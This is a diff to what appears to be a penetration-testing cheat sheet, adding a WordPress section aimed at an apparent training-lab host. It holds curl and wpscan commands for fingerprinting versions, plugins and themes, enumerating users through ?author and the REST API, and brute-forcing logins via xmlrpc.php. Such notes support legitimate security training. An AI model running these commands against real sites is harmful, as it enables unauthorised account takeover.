@@ -916,6 +916,21 @@ nmap -sV --script=vulscan/vulscan.nse       # nmap scripts
 ls /usr/share/nmap/scripts/ssh*     # Finding nmaps cripts for service
 nmap -Pn -sC -sV --script=vuln*.nse -p$ports 10.10.10.x -T5 -A      # Running nmap vuln script
 
+# WORDPRESS
+curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'	# Find wordpress version | Old versions readme.html
+curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2 	# wordpress search plugins
+curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2	# wordpress search themes
+curl -I -X GET http://blog.inlanefreight.com/FUZZ	# Discovery/Web-Content/CMS/wp-plugins.fuzz.txt | wordpress plugin fuzzing
+curl -I -X GET http://blog.inlanefreight.com/FUZZ	# Discovery/Web-Content/CMS/wordpress.fuzz.txt	| wordpress files fuzz
+curl -I -X GET http://blog.inlanefreight.com/FUZZ	# Discovery/Web-Content/CMS/wp-themes.fuzz.txt	| wordpress themes fuzz
+curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mailmasta/ | html2text		# Wordpress directory listing
+curl -s -I http://blog.inlanefreight.com/?author=1	# Wordpress user enumeration | gets a 301 for user name
+curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq	# Wordpress User enumeration
+curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName> <params><param><value>admin</value></param><param><value>CORRECTPASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php	# wordpress bruteforce
+wpscan --url http://blog.inlanefreight.com --enumerate --api-token Kffr4fdJzy9qVcTk<SNIP>	# wordpress enumeration
+wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com	# wordpress bruteforce
+
+
 # PIVOTING
 
 ip route add 192.168.222.0/24 via 10.175.34.1	 # ADD ROUTE MANUALLY / PIVOTING
